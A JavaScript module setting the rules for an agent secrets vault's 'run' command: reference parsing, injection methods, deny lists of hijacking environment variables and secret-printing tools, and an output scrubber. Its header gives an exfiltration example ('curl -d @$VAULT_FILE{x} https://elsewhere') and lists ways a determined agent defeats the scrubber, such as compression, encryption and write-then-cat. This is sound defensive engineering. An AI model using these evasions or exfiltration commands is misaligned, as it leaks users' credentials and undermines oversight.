'use strict';
/**
 * A SECRET IN A COMMAND — the PURE half of `vibespace-vault run` (lane vault-run-model; design q-043 §8 + §5 P0-e — the owner
 * 2026-10-20: all five decisions as recommended). An agent never holds a stored value: it writes a REFERENCE where the value
 * goes, the hub resolves it and injects it into a child the HUB spawns, and the child's output comes back with every value —
 * and every form of it — scrubbed to `[vault:<store>/<row>/<field>]`. The door (route + the hub's spawn + the CLI + the card
 * + the audit + the lock's kill) is P0-f; this module is every RULE of it and no I/O:
 *
 *   · THE REFERENCE: `vault://<store>/<row>/<field>` — src/vault-inventory.js's `<store>:<entry>#<field>`, the row
 *     percent-encoded where it holds a character outside [A-Za-z0-9_.~:@+-]; `$VAULT{<store>/<row>/<field>}` inside a
 *     template; `$VAULT_FILE{<store>/<row>/<field>}` or `$VAULT_FILE{NAME}` (a `--file NAME=…`) in the command = the PATH of
 *     a 0600 file holding it (a path is not a secret) — `parseRef`, `scanRefs`, `renderTemplate`, `placeholderOf`. An
 *     AGENT'S OWN entry (lane vault-mint-put, design §9: `agent:<scope>/<name>` in the hub's secrets) is spelled the way
 *     `vibespace-vault mint|put` hands it out — `vault://agent:<scope>/<name>` (also `$VAULT{agent:…}`) — the same entry as
 *     `vault://secrets/agent:<scope>%2F<name>/secret`; only ITS conversation may reference it (`agentScopeOf`, lane vault-run-door).
 *   · THE INJECTION TABLE (`INJECTIONS`, `injectionOf`, `planOf`): env (`--env NAME=vault://…`, the default) → a 0600 file
 *     (`--file NAME=vault://…`, `--file NAME=@template` = `op inject`, `$VAULT_FILE{…}`) → stdin (`--stdin vault://…`: the
 *     value + a newline); a reference IN ARGV is REFUSED (`argv_refused`: /proc/<pid>/cmdline is readable by every user of
 *     the machine — lane vault-p1-secrets-off-argv's law); `--allow-argv` opens it only for a KNOWN tool marked argv-only
 *     (none today) and the plan says `argvExposed`. The agent's plain env may not name a library the tool loads, code an
 *     interpreter or shell runs first, a program the tool starts, a config it obeys, a proxy or PATH (`env_refused`); its
 *     NAMES are part of the shape.
 *   · THE REFUSAL TABLE (`TOOL_ROWS`, `refusedTool`): a tool (argv[0] resolved on the agent env's PATH, never the cwd — the
 *     door resolves, the resolved path is the shape's tool) that prints, transforms, packs or copies what it reads, records
 *     another process or wraps another tool is refused BY NAME (`tool_prints_secrets` · `tool_wraps_another`); VibeSpace's
 *     own CLIs and the agent browser reach the vault through their own doors (`tool_has_its_own_door`). A shell or an
 *     interpreter is not refused: its whole command line IS the shape, shown verbatim, never «always».
 *   · THE KNOWN TOOLS (`KNOWN_TOOLS`, §8.4): default hosts, where a tool's hosts come from (URLs, scp-like targets, an ssh
 *     target, a host flag, a registry), its subcommand words, whether it honours the proxy env (P1 vault-run-egress fences
 *     on it); a tool outside the table, or one naming no host = destination UNKNOWN (said on the card, never «always»). Lane
 *     vault-agent-own (round 2): a URL tool's target written WITHOUT a scheme (`curl evil.example.com`, httpie's `:3000`), a
 *     libpq connection string's `host=` / `hostaddr=` and a URI's host LIST (`postgresql://a,b/db`), an ATTACHED short flag
 *     (`-hHOST`, `-oProxyCommand=…` — getopt: the first letter that takes a value takes the rest of the word) and gh's
 *     `--hostname` / `-R HOST/OWNER/REPO` are READ as hosts; a target the shape cannot list (a curl glob, a bare number, a URL
 *     it cannot read, curl `--expand-*`) makes the shape BLIND (`unread`).
 *   · THE SHAPE KEY (`shapeOf`, `shapeKeyOf`; decision ④): tool + flags (order-free) + hosts + entries + injection + the
 *     plain env (names AND values — lane vault-run-door: `PGHOST=evil` is another shape) + the templates' text + `--on`; a
 *     known tool's subcommand words belong to the tool, and so do the VALUES of its routing flags (`keyed`: ssh -o / -J /
 *     -F, curl -x / --resolve / --connect-to, git -c, rsync -e); every other positional is a CLASS (<path> <word> <number>
 *     <url> <vaultfile>) — a new file name is the same shape, a new host, flag, entry, route or subcommand is not. «always»
 *     is never offered for a shell, an interpreter, an unknown destination, a tool that runs the project's own code (npm,
 *     pip, docker), a config file the card cannot show (curl -K, ssh -F, kubectl --kubeconfig) or a program an agent could
 *     have written (`programWritable` — the door's fact).
 *   · THE VERDICT (`runVerdict`, §8.3): not set up / locked FIRST; the plan's and the tool's refusals; an entry with its own
 *     door (`OWN_DOORS`) / unknown / not opened for runs / too short to scrub; the conversation's grant; a remembered «always» for
 *     this shape; else a cluster ASKS every time (once / always / deny — the urgent card, 60 s) and a local instance asks the
 *     FIRST time a shape runs and allows it after one 允许 (`seen` — the owner's decision ②; still audited, still scrubbed).
 *   · THE OWN ROAD (lane vault-agent-own — the owner 2026-10-26: 「它自己存的使用为啥还要我的允许？」): an `agent:` entry is runnable by
 *     the conversation that made it BY CONSTRUCTION — no switch, no grant, no card (`ownsAgentEntry`: the entry's scope is that
 *     conversation — its registered id for an entry made before this lane, its DURABLE id, the CLI session id a resumed
 *     conversation keeps, for one made since). Provenance decides ONE thing: a value the agent PUT (it saw it) never asks; a value
 *     the hub MINTED (the agent never saw it) asks ONCE PER HOST when a run names a host other than the one it was minted `--for`
 *     (`awayOf` — the only leak the card can still prevent); a run whose destination cannot be told — a shell, an interpreter,
 *     an unknown tool, a routing flag, a config file, project code, a program an agent could write, and (round 2) a known tool
 *     whose host the table did not read (every row of the table reaches the network: no host read is not «no host») — asks
 *     once per command SHAPE on a local instance and EVERY run on a cluster, where only a live «always» (the second password)
 *     passes it, as for the owner's own entries. Still audited, still scrubbed.
 *   · THE SCRUBBER (`FORMS` / `FORM_ROWS` — THE ONE LIST, each form with a real tool that prints it by itself; `formsOf`,
 *     `VIEWS`, `createRunMasker`, `createMasker`, `maskText`): the value in every spelling a real producer prints becomes its
 *     placeholder. SPELLED (texts built from the value): raw; base64 (standard and URL-safe, padded or not, and the value's own
 *     characters at each of the three byte alignments it can take inside a longer base64 run: `Authorization: Basic
 *     base64(user:pass)`); percent-encoded (upper / lower hex; the encodeURIComponent, RFC 3986, path, WHATWG-form and
 *     every-byte spellings, `+` for a space); JSON-escaped (`\"`, `\/`, `\uXXXX`, the HTML-safe `<`); hex (upper / lower);
 *     UTF-16 LE / BE; base32 (RFC 4648, padded or not, either case). READ (lane vault-scrub-forms — a VIEW undoes one family
 *     of escapes and looks for every spelled form in what it reads; the placeholder replaces the span, its escapes included):
 *     quoted-printable (=XX, soft breaks); backslash escapes (\xNN, octal, \uXXXX, \u{…}, \UXXXXXXXX, \\ \' \" \n \t \r);
 *     HTML / XML entities; colour escapes (SGR / EL, `ESC(B`); line breaks (wrapped base64). ONE window per run: a run has
 *     ONE masker fed by stdout and stderr in arrival order, holding back its last (longest spelled form − 1) characters as
 *     every view reads them, plus a token not finished yet — a value split across chunks, or between the two pipes, is
 *     still caught, and chunked or whole the output is the same. The output belt (src/agent-output-belt.js) masks whole
 *     texts with the same table (`maskText`), so it keeps no window of its own.
 *     THE FLOOR: the scrubber masks a WHOLE value in a spelling, never a part of one — a fragment passes (its last four
 *     characters, half of it); a value under 8 bytes (MIN_MASK_BYTES) cannot be scrubbed without scrubbing ordinary text
 *     and is never referenced (`entry_too_short_to_mask`).
 *
 * WHAT IT IS NOT — §8.6, the three holes, said where the code is:
 *   ① the child runs as the agent's uid today: the agent can read /proc/<child>/environ and the 0600 file while it runs —
 *     hygiene and an audit boundary, NOT isolation (q-040's per-run uid closes it; the hub spawns the child, never the
 *     CLI, so the shape does not change when it lands);
 *   ② a tool can SEND the value somewhere (`curl -d @$VAULT_FILE{x} https://elsewhere`): the card shows the hosts and the
 *     whole command; the egress fence is P1 (vault-run-egress);
 *   ③ THE SCRUBBER IS A SIEVE. It reads the child's stdout and stderr and catches the value in the forms above — nothing
 *     else: what an adversary invents passes — a custom encoding, compression (gzip + base64: a compressed stream is not a
 *     spelling, its bytes depend on everything before them), encryption, a hash or an HMAC, a reversal, a case swap, the
 *     characters spaced out, a value split between the pipes with other output between its halves, two escape families on
 *     one value at once — and so does a fragment (THE FLOOR above); a value WRITTEN TO A FILE that the agent then `cat`s
 *     with its own shell never meets the scrubber at all — WRITE-THEN-CAT DEFEATS IT. The refusal table is a belt, not a proof.
 *     `run` stops ACCIDENTAL printing and a casual prompt injection; it does not stop a determined agent with a shell under
 *     the same uid — the same sentence q-040 says of per-session uids.
 *   (Not a hole, a boundary: the exit code, the duration and a file's size are never scrubbed.)
 *
 * PURE: imports only src/vault-inventory.js (the stores, the reference grammar) and src/vault-blocked.js (THE words of a
 * locked vault) — PURE → PURE. Gate: scripts/test-vault-run-model.mjs (every table + twelve mutants).
 */
const VI = require('./vault-inventory.js');
const VB = require('./vault-blocked.js');

const SCHEME = 'vault://';
const MIN_MASK_BYTES = 8;                        // a shorter value cannot be scrubbed without scrubbing ordinary text
const CMD_MAX = 4096;                            // bytes of the command line (exit run's bound)
const TEMPLATE_MAX = 65536;                      // bytes of one template (its text is part of the shape key)
const TEMPLATE_CARD_MAX = 4096;                  // round 17 (item 1): the card renders a config template IN FULL up to this (under DETAIL_MAX, so a shown-in-full template never overflows the card); a larger one is shown as a one-line note and is not vouched — «always» is not offered (the card cannot show what it reads in full)
const TIMEOUT_DEFAULT_S = 120;
const TIMEOUT_MAX_S = 600;
const OUTPUT_MAX_BYTES = 2 * 1024 * 1024;        // per run, the device's bound
const ASK_TTL_MS = 60000;                        // an unanswered card is refused by name (`ask_expired`, exit-proxy askOnce)
const ALWAYS_TTLS = Object.freeze({ '8h': 8 * 3600e3, '30d': 30 * 86400e3, forever: null });
const ALWAYS_DEFAULT = '30d';
const SHAPE_V = 'vr2';                           // a change of the key's spelling bumps it (every stored «always» asks again)
const SHAPE_NOTE = 'this shape = the tool + its flags + the hosts + the entries; positional arguments may change';

// ── THE WORDS (the code is the contract; the sentence is what an agent reads) ──
const WORDS = Object.freeze({
  vault_not_set_up: 'the vault is not set up on this instance — there is nothing to reference',
  vault_locked: VB.agentWords('a run waits until a person unlocks it on this instance\'s page'),
  bad_flag: 'usage: vibespace-vault run [--env NAME=vault://…] [--file NAME=vault://…|@template] [--stdin vault://…] [--allow-argv] [--on <machine>] [--timeout <s>] -- <command…>',
  bad_reference: 'a reference is vault://<store>/<row>/<field> (vibespace-vault list names the ones this conversation may use); in a template $VAULT{<store>/<row>/<field>}, in the command $VAULT_FILE{…} for a file\'s path',
  bad_env_name: 'an env name is letters, digits and _ (not starting with a digit)',
  duplicate_name: 'one NAME, one value — a name given twice is refused',
  env_refused: 'that variable would change what the tool loads, runs, obeys or reaches — refused by name',
  no_command: 'nothing to run — give the command after --',
  cmd_too_long: `the command is longer than ${CMD_MAX} bytes`,
  no_reference: 'the command references nothing in the vault — run it with your own shell',
  template_unread: 'the template was not read (the door hands its text in)',
  template_too_long: `a template is longer than ${TEMPLATE_MAX} bytes`,
  argv_refused: 'a value on the command line is visible to every user of the machine (/proc/<pid>/cmdline): pass it with --env NAME=vault://…, --file NAME=vault://… / $VAULT_FILE{…}, or --stdin vault://…',
  tool_prints_secrets: 'that tool prints, transforms, packs or copies what it reads — refused by name (a value would leave through its output or a file)',
  tool_wraps_another: 'that tool starts another one — run the tool itself (the run has its own timeout)',
  tool_has_its_own_door: 'VibeSpace\'s own CLIs and the agent browser reach the vault through their own doors',
  entry_has_its_own_door: 'that entry is never referenced by a run — it has its own door',
  entry_unknown: 'no such entry (vibespace-vault list names the ones this conversation may use)',
  entry_not_runnable: 'the user has not opened that entry for runs (⚙ System ▸ Vault…: the row\'s «Usable by agent runs», off by default) — ask them for it with its purpose: vibespace-vault request <vault://…> --for "<why>" (a question in their For you tray; nothing waits on it)',
  entry_too_short_to_mask: `that value is shorter than ${MIN_MASK_BYTES} bytes and cannot be scrubbed from the output — it is never referenced`,
  use_not_granted: 'this conversation may not use that entry — ask the user for it with its purpose: vibespace-vault request <vault://…> --for "<why>" (another conversation\'s own entry stays its own)',
  // ── THE DOOR's codes (lane vault-run-door, P0-f — src/server/vault-run-door.js) ──
  job_no_use: 'a Background Work job never runs with a stored secret — run it from the conversation itself',
  device_road_later: 'a run on a paired machine (a remote conversation, --on) is not here yet — a run starts on this instance only',
  cwd_refused: 'a run starts in the conversation\'s project folder, the temp folder or ~/Downloads — cd there first',
  tool_not_found: 'no such program on this instance\'s PATH (a bare name is never looked up in the current folder)',
  template_refused: 'a template is a regular file in the project folder, the temp folder or ~/Downloads',
  ask_pending: 'the same command shape already waits for the user\'s answer — wait for it, then run again',
  ask_denied: 'the user did not allow it — nothing ran',
  ask_expired: 'the user did not answer within 60 s — nothing ran; tell them in the chat, then run it again',
  ask_unfiled: 'the question could not be put in front of the user (For you refused it) — nothing ran; resolve your open For-you items first',
  ask_changed: 'the request changed after it was shown — nothing ran; run it again',
  caller_gone: 'the call went away while it waited — nothing ran',
  too_many_runs: 'too many runs at once — wait for one to end',
  spawn_failed: 'the program could not be started',
});
function refuse(code, extra = {}) { return { ok: false, code, words: WORDS[code] || code, ...extra }; }
const refusalOf = refuse;   // the door's refusals in the same shape (one spelling of a code and its words)

// ── THE REFERENCE ──
const ROW_KEEP = /[^\w.~:@+-]/g;
const encRow = (entry) => String(entry).replace(ROW_KEEP, (c) => encodeURIComponent(c).replace(/[!'()*]/g, (x) => '%' + x.charCodeAt(0).toString(16).toUpperCase()));
const REF_BODY = '([a-z][a-z0-9-]{0,31})/([\\w.~:@+%-]{1,720})/([\\w.:-]{1,160})';
const REF_EXACT = new RegExp(`^${REF_BODY}$`);
const REF_HEAD = new RegExp(`^vault://${REF_BODY}`);
const ENV_NAME = /^[A-Za-z_][A-Za-z0-9_]{0,127}$/;
// lane vault-run-door: an AGENT's own entry (lane vault-mint-put — src/vault.js AGENT_NS_RE: `agent:<scope>/<name>`, the
// secrets store, field `secret`) as its CLI hands it out: `vault://agent:<scope>/<name>`
const AGENT_BODY = 'agent:([A-Za-z0-9._:-]{1,128})/([A-Za-z0-9._-]{1,64})';
const AGENT_EXACT = new RegExp(`^${AGENT_BODY}$`), AGENT_HEAD = new RegExp(`^vault://${AGENT_BODY}`);
const AGENT_ENTRY = /^agent:([A-Za-z0-9._:-]{1,128})\/([A-Za-z0-9._-]{1,64})$/;
const isAgentEntry = (store, entry, field) => store === 'secrets' && field === 'secret' && AGENT_ENTRY.test(String(entry));
// lane vault-paste-request: a FREE entry (`secret:<id>` — the owner pasted it for an agent, or added it in the Vault window):
// opened for runs like a storage credential — the row's switch, a grant (the owner's paste grants the conversation that asked)
const FREE_ENTRY = /^secret:[\w.-]{1,160}$/;
const isFreeEntry = (store, entry, field) => store === 'secrets' && field === 'secret' && FREE_ENTRY.test(String(entry));
function refOf(store, entry, field) {
  const id = VI.refOf(store, entry, field);
  if (!id) return null;
  const label = isAgentEntry(store, entry, field) ? String(entry) : `${store}/${encRow(entry)}/${field}`;   // an agent's own entry: its short spelling
  return Object.freeze({ store, entry, field, id, label, ref: SCHEME + label });
}
function bodyRef(store, row, field) { let entry; try { entry = decodeURIComponent(row); } catch { return null; } return refOf(store, entry, field); }
const agentRef = (scope, name) => refOf('secrets', `agent:${scope}/${name}`, 'secret');
/** A reference's body (after `vault://`, or inside `$VAULT{…}`) → the ref | null. */
function innerRef(body) { const m = REF_EXACT.exec(body); if (m) return bodyRef(m[1], m[2], m[3]); const a = AGENT_EXACT.exec(body); return a ? agentRef(a[1], a[2]) : null; }
/** `vault://<store>/<row>/<field>` or `vault://agent:<scope>/<name>` (the whole string) → { store, entry, field, id, label, ref } | null. */
function parseRef(s) {
  return typeof s === 'string' && s.startsWith(SCHEME) ? innerRef(s.slice(SCHEME.length)) : null;
}
/** An agent's own entry → the conversation that owns it (its scope); any other reference → null. */
const agentScopeOf = (ref) => { const m = ref && ref.store === 'secrets' && ref.field === 'secret' ? AGENT_ENTRY.exec(String(ref.entry)) : null; return m ? m[1] : null; };
const placeholderOf = (ref) => `[vault:${ref && ref.label ? ref.label : String(ref || '')}]`;
/** lane vault-agent-own: is `ref` an agent entry THIS caller made? Its scope is the conversation's registered id (an entry made
 *  before lane vault-agent-own) or its durable id (the CLI session id — kept across a resume; every entry made since): either
 *  spelling of the caller says yes. `caller` = { scope, conv, conversationId }: `conv` is the FORK-SAFE durable id (null for a
 *  pending fork, which borrows its parent's) — when the caller carries it, the raw conversationId is not read. */
const callerIdsOf = (caller) => (caller ? [caller.scope, ...(caller.conv !== undefined ? [caller.conv] : [caller.conversationId])] : []).filter((x) => typeof x === 'string' && x !== '');
function ownsAgentEntry(ref, caller = {}) {
  const sc = agentScopeOf(ref);
  return !!sc && callerIdsOf(caller).includes(sc);
}
/** A mint's `--for <host/service>` → the host it names (lower case — no scheme, user, port or path), or null. A bare word
 *  with no dot (`com`, a service's name) names no host: every host is then «another host» (a suffix must not cover a TLD). */
function forHostOf(s) {
  const m = /^(?:[a-z][a-z0-9+.-]{0,31}:\/\/)?(?:[^@\s\/?#]*@)?(\[[0-9a-f:.]+\]|[a-z0-9.-]+)/.exec(String(s == null ? '' : s).trim().toLowerCase());
  const h = m ? m[1].replace(/\.$/, '') : '';
  return h && h.length <= 253 && /[a-z0-9]/.test(h) && (/\.[a-z0-9-]/.test(h) || h === 'localhost' || h[0] === '[') ? h : null;
}
/** Is a run's `host` (a shape's: `name`, `name:port`, `*.suffix`) the host a value was minted for — or one under it? */
function sameHost(host, forHost) {
  const f = forHostOf(forHost), h = String(host == null ? '' : host).toLowerCase().replace(/:\d+$/, '').replace(/\.$/, '');
  if (!f || !h) return false;
  if (h.startsWith('*.')) { const s = h.slice(2); return f === s || f.endsWith('.' + s); }
  return h === f || h.endsWith('.' + f);
}
// round 12 (MINOR): gh honours GH_TOKEN only for github.com / *.ghe.com; any other (GHES) host reads GH_ENTERPRISE_TOKEN. The
// DOOR homes the agent's credential REFERENCE to the right env NAME for the run's pinned host (the agent names neither — see
// runSeal.credRef / credEnvOther). `host` null (a stored value, no --for host) or not-gh ⇒ the default credential name (GH_TOKEN).
function ghCredEnvFor(host, row) {
  const seal = (row && row.runSeal) || {};
  const def = seal.credRef || null, other = seal.credEnvOther || null;
  if (!def || !other || !host) return def;
  const h = String(host).toLowerCase().replace(/:\d+$/, '').replace(/\.$/, '');
  const github = h === 'github.com' || h === 'api.github.com' || /(?:^|\.)ghe\.com$/.test(h);
  return github ? def : other;
}
/** Every reference-shaped piece of `text` → { refs: [{ …ref, at, len, form: 'url' | 'brace' | 'file', name? }], bad: [{ at, text }] }.
 *  `form` url = `vault://…`; brace = `$VAULT{…}`; file = `$VAULT_FILE{…}` (`name` set when it names a `--file NAME`). A
 *  `vault://` / `$VAULT{` / `$VAULT_FILE{` in any letter case that does not parse is BAD — never read as plain text. */
function scanRefs(text) {
  const s = String(text == null ? '' : text);
  const refs = [], bad = [];
  const re = /vault:\/\/|\$vault(_file)?\{/gi;
  let m;
  while ((m = re.exec(s))) {
    const at = m.index;
    if (m[0][0] !== '$') {
      const h = m[0] === SCHEME ? REF_HEAD.exec(s.slice(at)) : null, ha = !h && m[0] === SCHEME ? AGENT_HEAD.exec(s.slice(at)) : null;
      const r = h ? bodyRef(h[1], h[2], h[3]) : ha ? agentRef(ha[1], ha[2]) : null;
      if (ha && r) { refs.push({ ...r, at, len: ha[0].length, form: 'url' }); re.lastIndex = at + ha[0].length; continue; }
      if (r) { refs.push({ ...r, at, len: h[0].length, form: 'url' }); re.lastIndex = at + h[0].length; } else bad.push({ at, text: s.slice(at, at + 80) });
      continue;
    }
    const file = !!m[1], close = s.indexOf('}', at), inner = close < 0 ? null : s.slice(at + m[0].length, close);
    const exact = m[0] === (file ? '$VAULT_FILE{' : '$VAULT{');
    const named = exact && file && inner != null && ENV_NAME.test(inner);
    const r = exact && inner != null && !named ? innerRef(inner) : null;
    if (named) refs.push({ at, len: close + 1 - at, form: 'file', name: inner });
    else if (r) refs.push({ ...r, at, len: close + 1 - at, form: file ? 'file' : 'brace' });
    else { bad.push({ at, text: s.slice(at, at + 80) }); continue; }
    re.lastIndex = close + 1;
  }
  return { refs, bad };
}
/** A template's `$VAULT{…}` rendered with `valueOf(ref)` (the door's last step — `op inject`). */
function renderTemplate(text, valueOf) {
  const s = String(text == null ? '' : text), { refs } = scanRefs(s);
  let out = '', i = 0;
  for (const r of refs) { if (r.form !== 'brace') continue; out += s.slice(i, r.at) + String(valueOf(r.ref)); i = r.at + r.len; }
  return out + s.slice(i);
}

// ── THE INJECTION TABLE (the order is the preference) ──
const INJECTIONS = Object.freeze([
  Object.freeze({ where: 'env', flag: '--env NAME=vault://…', open: true, seen: 'the child\'s environment (/proc/<pid>/environ — its own uid)', use: 'the default: a tool that reads a token from a variable (GH_TOKEN, PGPASSWORD, AWS_SECRET_ACCESS_KEY)' }),
  Object.freeze({ where: 'file', flag: '--file NAME=vault://… · --file NAME=@template · $VAULT_FILE{…}', open: true, seen: 'a 0600 file in a 0700 run directory, shredded when the child exits', use: 'a tool that reads only a file (curl -K, .npmrc, kubeconfig, my.cnf, ssh -i)' }),
  Object.freeze({ where: 'stdin', flag: '--stdin vault://…', open: true, seen: 'the child\'s stdin (the value + a newline)', use: 'docker login --password-stdin, gh auth login --with-token' }),
  Object.freeze({ where: 'argv', flag: '--allow-argv', open: false, seen: '/proc/<pid>/cmdline — every user of the machine', use: 'refused by default; --allow-argv opens it for a known argv-only tool only (audited argvExposed, a red line on the card)' }),
]);
/** → { ok, where, argvExposed } | refusal. `row` = the tool's KNOWN_TOOLS row. */
function injectionOf(where, { allowArgv = false, row = null } = {}) {
  const r = INJECTIONS.find((x) => x.where === where);
  if (!r) return refuse('bad_flag');
  if (r.open) return { ok: true, where, argvExposed: false };
  const argvOpen = !!allowArgv && !!(row && row.argvOnly);
  return argvOpen ? { ok: true, where, argvExposed: true } : refuse('argv_refused', { why: allowArgv ? 'not an argv-only tool' : 'refused by default' });
}

// ── THE PLAIN ENV an agent may not set (a belt: its NAMES are in the shape too) ──
const ENV_HIJACK = Object.freeze([
  Object.freeze({ re: /^(?:LD_\w*|DYLD_\w*)$/, why: 'the loader would load a library into the tool' }),
  Object.freeze({ re: /^(?:NODE_OPTIONS|NODE_PATH|PYTHONSTARTUP|PYTHONPATH|PYTHONHOME|PYTHONUSERBASE|PERL5OPT|PERL5LIB|PERLLIB|RUBYOPT|RUBYLIB|JAVA_TOOL_OPTIONS|_JAVA_OPTIONS|JDK_JAVA_OPTIONS)$/, why: 'an interpreter would run other code first' }),
  Object.freeze({ re: /^(?:BASH_ENV|ENV|SHELLOPTS|BASHOPTS|PROMPT_COMMAND|PS4|IFS|ZDOTDIR|BASH_FUNC_\S*)$/, why: 'a shell would run other code first' }),
  Object.freeze({ re: /^(?:GIT_SSH|GIT_SSH_COMMAND|GIT_EXEC_PATH|GIT_ASKPASS|SSH_ASKPASS|GIT_PROXY_COMMAND|GIT_CONFIG\w*|EDITOR|VISUAL|PAGER|GIT_PAGER|GIT_EDITOR|MANPAGER|BROWSER|RSYNC_RSH|RSYNC_CONNECT_PROG)$/, why: 'the tool would start a program it names' }),
  Object.freeze({ re: /^(?:GH_ENTERPRISE_TOKEN|GITHUB_ENTERPRISE_TOKEN)$/, why: 'it is a credential for an Enterprise Server host — gh would send it off the host the run was minted for' }),   // round 11 (BLOCKER): the off-host credential half of the planted-config road (gh honours it for a non-github host, bypassing the for-host check)
  Object.freeze({ re: /^(?:SSL_CERT_FILE|SSL_CERT_DIR|GIT_SSL_CAINFO|CURL_CA_BUNDLE)$/, why: 'it points TLS trust at a CA the agent chose, so a run\'s host can be impersonated — the connection is terminated at the agent\'s cert' }),   // round 11 (BLOCKER): the TLS-termination half
  Object.freeze({ re: /^PATH$/, why: 'the tool was resolved on the agent\'s PATH; another would change what it starts' }),
]);
const ENV_CONFIG = Object.freeze([   // a plain value pointing at the agent's own file is refused; a `--file NAME=…` the hub renders is not
  Object.freeze({ re: /^(?:KUBECONFIG|CURL_HOME|WGETRC|DOCKER_CONFIG|AWS_CONFIG_FILE|AWS_SHARED_CREDENTIALS_FILE|NPM_CONFIG_USERCONFIG|PIP_CONFIG_FILE|PGSERVICEFILE|PGPASSFILE|PGSYSCONFDIR|PSQLRC|RCLONE_CONFIG|HTTPIE_CONFIG_DIR|GH_CONFIG_DIR|MYSQL_HOME|NETRC)$/i, why: 'it points the tool at a config it obeys' }),   // round 2: PSQLRC (its `\!` runs a shell)
  Object.freeze({ re: /^(?:HOME|XDG_CONFIG_HOME|XDG_DATA_HOME|XDG_CACHE_HOME)$/, why: 'it moves the home a tool reads its config from' }),   // lane vault-run-door (the security review)
  Object.freeze({ re: /^(?:https?_proxy|all_proxy|no_proxy|ftp_proxy)$/i, why: 'where a run may go is the hub\'s (vault-run-egress)' }),
]);
/** NAME → why it is refused, or null. `as` = 'plain' | 'env' (a value) | 'file' (a path the hub renders). `row` = the tool's
 *  KNOWN_TOOLS row: a tool that declares an env ALLOWLIST (`row.envAllow`) refuses every name but the reviewed ones + the credential. */
function envRefusedOf(name, as = 'plain', row = null) {
  const n = String(name || '');
  // round 12 (MAJOR): the agent's env is an ALLOWLIST, not a denylist — for a tool that declares one (gh), only the reviewed
  // names (and the credential, as a reference) pass; the host, the config dir and the credential env NAME are the DOOR's to set,
  // refused BY NAME; every other name (GIT_* / SSL_* / *_PROXY / LD_* / NODE_OPTIONS / GIT_ASKPASS / SSH_* / GIT_TRACE2_*) is
  // refused WITHOUT a denylist that can go stale. (The envHijack derivation stays an ADVISORY census: no allowlist name is one.)
  if (row && Array.isArray(row.envAllow)) {
    const seal = row.runSeal || {};
    const doorSets = [seal.hostEnv, seal.configDirEnv, seal.credEnvOther, 'GITHUB_TOKEN', 'GITHUB_ENTERPRISE_TOKEN'].filter(Boolean);
    if (seal.credRef && n === seal.credRef) return as === 'env' ? null : 'the door sets the credential for the run — pass it as a vault reference, never a literal';
    if (doorSets.includes(n)) return 'the door sets this for the run (the host, the config dir and the credential env name are the hub\'s) — the agent names none of them';
    if (row.envAllow.includes(n) || (row.envAllowRe || []).some((p) => new RegExp(p).test(n))) return null;
    return `it is not in ${row.name}'s reviewed env allowlist (${row.envAllow.join(', ')}${(row.envAllowRe || []).length ? ', ' + row.envAllowRe.join(', ') : ''} + the credential as a reference) — every other name is refused by name`;
  }
  const h = ENV_HIJACK.find((r) => r.re.test(n));
  if (h) return h.why;
  if (TOOL_ENV_HIJACK.has(n)) return 'the tool would start a program it names';   // round 7 (MAJOR 4): GH_BROWSER / GH_EDITOR / GH_PAGER (gh reads the GH_ ones FIRST) — DERIVED into the gh row's envHijack from `gh help environment`
  const c = as === 'file' ? null : ENV_CONFIG.find((r) => r.re.test(n));
  return c ? c.why : null;
}

// ── THE REFUSAL TABLE (argv[0], resolved) ──
const TOOL_ROWS = Object.freeze([
  Object.freeze({ cls: 'print', code: 'tool_prints_secrets', names: ['echo', 'printf', 'cat', 'tac', 'nl', 'tee', 'head', 'tail', 'less', 'more', 'most', 'pg', 'bat', 'batcat', 'view', 'env', 'printenv', 'export', 'set', 'declare', 'typeset', 'readonly', 'strings', 'column', 'pr', 'fmt', 'jq', 'yq', 'grep', 'egrep', 'fgrep', 'rg', 'ag', 'diff', 'cmp', 'sort', 'uniq', 'look', 'zcat', 'bzcat', 'xzcat', 'zstdcat', 'lz4cat', 'zless', 'zmore', 'vi', 'vim', 'nvim', 'nano', 'emacs', 'ed', 'ex', 'pico', 'micro'] }),
  Object.freeze({ cls: 'transform', code: 'tool_prints_secrets', names: ['xxd', 'od', 'hexdump', 'hd', 'base64', 'base32', 'basenc', 'uuencode', 'uudecode', 'rev', 'tr', 'cut', 'fold', 'paste', 'sed', 'gsed', 'awk', 'gawk', 'mawk', 'nawk', 'iconv', 'recode', 'md5sum', 'sha1sum', 'sha224sum', 'sha256sum', 'sha384sum', 'sha512sum', 'b2sum', 'cksum', 'sum', 'shasum'] }),
  Object.freeze({ cls: 'pack', code: 'tool_prints_secrets', names: ['gzip', 'gunzip', 'bzip2', 'bunzip2', 'xz', 'unxz', 'lzma', 'unlzma', 'zstd', 'unzstd', 'lz4', 'zip', 'unzip', 'tar', '7z', '7za', '7zr', 'rar', 'unrar', 'cpio', 'ar', 'pax', 'openssl', 'gpg', 'gpg2', 'age'] }),
  Object.freeze({ cls: 'copy', code: 'tool_prints_secrets', names: ['cp', 'mv', 'dd', 'install', 'ln', 'link', 'split', 'csplit'] }),
  Object.freeze({ cls: 'trace', code: 'tool_prints_secrets', names: ['strace', 'ltrace', 'gdb', 'lldb', 'perf', 'valgrind', 'bpftrace', 'script'] }),
  Object.freeze({ cls: 'wrapper', code: 'tool_wraps_another', names: ['sudo', 'doas', 'su', 'runuser', 'sg', 'newgrp', 'nice', 'ionice', 'nohup', 'timeout', 'time', 'stdbuf', 'setsid', 'xargs', 'parallel', 'watch', 'flock', 'chroot', 'unshare', 'nsenter', 'busybox', 'toybox', 'command', 'exec', 'builtin', 'eval', 'taskset', 'chrt', 'systemd-run', 'firejail', 'bwrap', 'proot', 'fakeroot'] }),
  Object.freeze({ cls: 'door', code: 'tool_has_its_own_door', names: ['agent-browser'], prefix: 'vibespace-' }),
]);
const REFUSING = TOOL_ROWS;
const SHELLS = Object.freeze(['sh', 'bash', 'zsh', 'dash', 'ksh', 'mksh', 'ash', 'fish', 'csh', 'tcsh', 'pwsh', 'powershell', 'cmd']);
const INTERPRETERS = Object.freeze(['node', 'nodejs', 'deno', 'bun', 'python', 'pypy', 'perl', 'ruby', 'php', 'lua', 'luajit', 'tclsh', 'wish', 'rscript', 'julia', 'java', 'dotnet']);   // a Mac's interpreters come with the device road (P1 vault-run-device)

// ── THE KNOWN TOOLS (§8.4 — P1 vault-run-egress fences the `proxyEnv` ones) ──
const SSH_VALUE_FLAGS = ['-b', '-c', '-D', '-E', '-e', '-F', '-I', '-i', '-J', '-L', '-l', '-m', '-O', '-o', '-p', '-P', '-Q', '-R', '-S', '-W', '-w', '-B'];
